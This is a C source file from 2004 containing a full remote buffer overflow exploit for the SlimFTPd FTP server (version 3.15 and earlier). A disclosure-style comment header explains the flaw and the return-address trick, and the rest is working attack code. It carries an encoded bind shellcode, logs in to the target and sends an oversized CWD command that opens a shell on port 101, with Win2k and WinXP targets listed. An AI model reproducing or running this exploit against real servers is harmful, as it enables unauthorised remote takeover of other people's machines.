/*



SlimFTPd <= 3.15, Remote Buffer Overflow Exploit v0.1.
Bind a shellcode to the port 101.

Full disclosure and exploit
by class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
10 november 2004

Thanx to HDMoore and Metasploit.com for their kickass ASM work.


------------------
WHAT IS SLIMFTPD
------------------

Homepage - http://www.whitsoftdev.com/slimftpd/

        SlimFTPd is a fully standards-compliant FTP server implementation with an advanced
        virtual file system.It is extremely small, but don't let its file size deceive you:
        SlimFTPd packs a lot of bang for the kilobyte. It is written in pure Win32 C++ with
        no external dependencies and no messy installer. SlimFTPd is a fully multi-threaded
        application that runs as a system service on Windows 98/ME or Windows NT/2K/XP, and
        it comes with a tool to simplify its installation or uninstallation as a system service.
        Once the service is started, SlimFTPd runs quietly in the background.
        It reads its configuration from a config file in the same folder as the executable,
        and it outputs all activity to a log file in the same place.
        The virtual file system allows you to mount any local drive or path to any virtual
        path on the server. This allows you to have multiple local drives represented on the
        server's virtual file system or just different folders from the same drive.
        SlimFTPd allows you to set individual permissions for server paths.
        Open slimftpd.conf in your favorite text editor to set up SlimFTPd's configuration.
        The format of SlimFTPd's config file is similar to Apache Web Server's for those
        familiar with Apache.


--------------
VULNERABILITY
--------------

        A simple buffer overflow when a large buffer is passed to different commands,
        CWD, STOR, MKD, STAT etc.., nothing more, the attacker need to be logged in,
        read the code for further instructions.

----
FIX
----

        Actually none, the vendor is contacted, is warning users, and working on a fix.

----
EXTRA
----

        Ok I'll try to explain what happen in this one with my crap english...
        As you can notice , I havent used as usual a CALL/JMP offset address from a DLL.
        Why ? Because if you debug, you will notice that we are able to overwrite
        only 3/4 bytes of EIP maximum due to a buffer length restriction in the ftp server (~500bytes).
        The 4th byte will always point to 00. But this 00 is enough helpful to fake there my
        magic ret ;p
        Ok once you understand what is this magic ret , I think that you understanded all there...

----
BY
----

    class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
                                                 who
                                           F.U.C.K
    K-OTik.com displaying the half part of codes they receive
        (also some other friends to me noticed it..., another ie:
        JPEG Exploits, 6 or 7 mirrors displayed, poor assh0les...)


*/

#include "winsock2.h"
#include "fstream.h"


char scode[] = "\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
"\x58\x68\x61\x63\x6B\x90";

char cmd[]="CWD ";
char call[]="\xb2\x06\x40"; // Magicret ;p

#pragma comment(lib, "ws2_32")


void usage(char* us);
WSADATA wsadata;
void ver();

static char payload[5000];

int main(int argc,char *argv[])
{
        ver();
        if ((argc<5)||(argc>6)||(atoi(argv[1])<1)||(atoi(argv[1])>2)){usage(argv[0]);return -1;}
        if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
        char *login=argv[2], *passwd=argv[3], data[10], recvbuf2[100], recvbuf[100], rootbuf[100], logbuf[100], logbuf2[100], pdbuf[100], pdbuf2[100];
        int ip=htonl(inet_addr(argv[4])), sz, a, sizeA, lgth, port;
        if (argc==6){port=atoi(argv[5]);}
        else port=21;
        char *os;
        if (atoi(argv[1]) == 1){os="Win2k based system";}
        if (atoi(argv[1]) == 1){os="Win2k based system";}
        if (atoi(argv[1]) == 2){os="WinXP based system";}
        if (atoi(argv[1]) == 2){os="WinXP based system";}
        SOCKET s;
        struct fd_set mask;
        struct timeval timeout;
        struct sockaddr_in server;
        s=socket(AF_INET,SOCK_STREAM,0);
        if (s==INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
        cout<<"[+] target: "<<os<<endl;
        server.sin_family=AF_INET;
        server.sin_addr.s_addr=htonl(ip);
        server.sin_port=htons(port);
        WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
        timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
        switch(select(s+1,NULL,&mask,NULL,&timeout))
        {
                case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
                case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
                default:
                if(FD_ISSET(s,&mask))
                {
                        cout<<"[+] connected, login in process..."<<endl;
                        Sleep(100);recv(s,recvbuf2,100,0);
                        if (!strstr(recvbuf2,"220")){cout<<"[+] this is not an ftp server, quitting..."<<endl;return -1;}
                        strcpy(logbuf,"USER ");strcpy(logbuf2,login);strcpy(pdbuf,"PASS ");strcpy(pdbuf2,passwd);strcpy(rootbuf,"STOU AUX");strcpy(data,"\r\n");
                        if (send(s,logbuf,strlen(logbuf),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,logbuf2,strlen(logbuf2),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,data,strlen(data),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        Sleep(1000);
                        if (send(s,pdbuf,strlen(pdbuf),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,pdbuf2,strlen(pdbuf2),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,data,strlen(data),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        Sleep(1000);
                        if (recv(s,recvbuf,200,0)==SOCKET_ERROR){ cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (strstr(recvbuf,"530")){ cout<<"[+] wrong login or passwd"<<endl;return -1;}
                        cout<<"[+] login success!"<<endl;Sleep(1000);cout<<"[+] sending the exploit string"<<endl;
                        if (atoi(argv[1]) == 1){lgth=500+1;}
                        if (atoi(argv[1]) == 2){lgth=498+1;}
                        sizeA=lgth-sizeof(scode);
                        sz=(sizeA-1)+sizeof(scode)+10;
                        memset(payload,0,sizeof(payload));
                        strcat(payload,cmd);strcat(payload,"\x41\x41\x41");
                        strcat(payload,scode);
                        for (a=0;a<sizeA;a++){strcat(payload,"\x41");}
                        strcat(payload,call);
                        strcat(payload,"\r\n");
                        Sleep(1000);
                    if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
                        if (send(s,data,strlen(data),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
                        Sleep(1000);
                        cout<<"[+] size of payload: "<<sz<<endl;
                        cout<<"[+] payload send, connect the port 101 to get a shell."<<endl;
                        return 0;
                }
        }
        closesocket(s);
        WSACleanup();
        return 0;
}

void usage(char* us)
{
        cout<<"USAGE: 101_slim.exe Target Login Pass Ip Port\n"<<endl;
        cout<<"TARGETS:                               "<<endl;
        cout<<"      [+] 1. Win2k SP4 English Pro    (*)"<<endl;
        cout<<"      [+] 1. Win2k SP4 English Server (*)"<<endl;
        cout<<"      [+] 1. Win2k all others            "<<endl;
        cout<<"      [+] 2. WinXP SP1 English Pro    (*)"<<endl;
        cout<<"      [+] 2. WinXP SP1 French Pro     (*)"<<endl;
        cout<<"      [+] 2. WinXP all others            "<<endl;
        cout<<"NOTE:                               "<<endl;
        cout<<"      The port 21 is default if no port are specified"<<endl;
        cout<<"      The exploit bind a shellcode to the port 101"<<endl;
        cout<<"      A wildcard (*) mean Tested."<<endl;
        return;
}
void ver()
{
cout<<endl;
cout<<"                                                                   "<<endl;
cout<<"        ===================================================[v0.1]===="<<endl;
cout<<"        ========SlimFTPd, Tiny FTP Server for Windows <= v3.15======="<<endl;
cout<<"        =============Remote Buffer Overflow Exploit=================="<<endl;
cout<<"        ====coded by class101===========[DFind.kd-team.com 2004]====="<<endl;
cout<<"        ============================================================="<<endl;
cout<<"                                                                   "<<endl;
}
